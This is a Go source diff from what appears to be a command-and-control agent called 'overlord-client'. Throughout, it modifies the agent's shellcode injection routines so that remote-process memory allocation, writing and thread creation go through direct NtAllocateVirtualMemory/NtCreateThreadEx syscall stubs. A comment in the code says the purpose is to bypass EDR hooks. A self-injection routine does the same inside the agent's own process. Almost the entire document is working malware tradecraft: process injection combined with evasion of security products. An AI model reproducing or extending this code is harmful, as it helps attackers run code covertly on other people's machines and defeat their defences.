@@ -18,6 +18,7 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"overlord-client/cmd/agent/evasion"
 	agentRuntime "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/wire"
 )
@@ -67,7 +68,9 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 }
 
 // injectCreateThread allocates RWX memory in the target process and starts a
-// thread at the shellcode address via NtCreateThreadEx.
+// thread at the shellcode address. Both allocation and thread creation are
+// routed through direct NtAllocateVirtualMemory / NtCreateThreadEx syscall
+// stubs (bypasses EDR hooks on the kernel32/ntdll Win32 dispatch path).
 func injectCreateThread(sc []byte, pid uint32) error {
 	proc, err := openTargetProcess(pid)
 	if err != nil {
@@ -75,37 +78,18 @@ func injectCreateThread(sc []byte, pid uint32) error {
 	}
 	defer windows.CloseHandle(proc)
 
-	k32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	virtualAllocEx := k32.NewProc("VirtualAllocEx")
-	writeProcessMemory := k32.NewProc("WriteProcessMemory")
-	ntCreateThread := ntdll.NewProc("NtCreateThreadEx")
-
-	const memCommitReserve = 0x3000
-	const pageExecReadWrite = 0x40
-
-	addr, _, _ := virtualAllocEx.Call(
-		uintptr(proc), 0, uintptr(len(sc)),
-		memCommitReserve, pageExecReadWrite,
-	)
+	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed")
+		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
-	writeProcessMemory.Call(uintptr(proc), addr,
-		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
 
-	var threadHandle uintptr
-	r, _, _ := ntCreateThread.Call(
-		uintptr(unsafe.Pointer(&threadHandle)),
-		0x1FFFFF, 0, uintptr(proc),
-		addr, 0, 0, 0, 0, 0, 0,
-	)
-	if r != 0 {
-		return fmt.Errorf("NtCreateThreadEx: 0x%x", r)
+	evasion.NtWriteRemote(uintptr(proc), addr, sc)
+
+	th := evasion.NtCreateThreadEx(uintptr(proc), addr)
+	if th == 0 {
+		return fmt.Errorf("NtCreateThreadEx failed")
 	}
-	if threadHandle != 0 {
-		windows.CloseHandle(windows.Handle(threadHandle))
-	}
+	windows.CloseHandle(windows.Handle(th))
 	return nil
 }
 
@@ -171,28 +155,19 @@ func injectAPC(sc []byte, pid uint32) error {
 // injectSelf allocates RWX memory in the current process and executes the
 // shellcode on a new thread. Used for testing / local execution.
 func injectSelf(sc []byte) error {
-	mem, err := windows.VirtualAlloc(0, uintptr(len(sc)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
-	if err != nil {
-		return fmt.Errorf("VirtualAlloc: %w", err)
+	const selfProc = ^uintptr(0) // (HANDLE)-1
+	mem := evasion.NtAllocateVirtualMemory(selfProc, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	if mem == 0 {
+		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(sc))
 	copy(dst, sc)
 
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	ntCreateThread := ntdll.NewProc("NtCreateThreadEx")
-	var threadHandle uintptr
-	r, _, _ := ntCreateThread.Call(
-		uintptr(unsafe.Pointer(&threadHandle)),
-		0x1FFFFF, 0, uintptr(^uintptr(0)), // -1 = current process
-		mem, 0, 0, 0, 0, 0, 0,
-	)
-	if r != 0 {
-		return fmt.Errorf("NtCreateThreadEx (self): 0x%x", r)
+	th := evasion.NtCreateThreadEx(selfProc, mem)
+	if th == 0 {
+		return fmt.Errorf("NtCreateThreadEx (self) failed")
 	}
-	if threadHandle != 0 {
-		windows.CloseHandle(windows.Handle(threadHandle))
-	}
+	windows.CloseHandle(windows.Handle(th))
 	return nil
 }
 
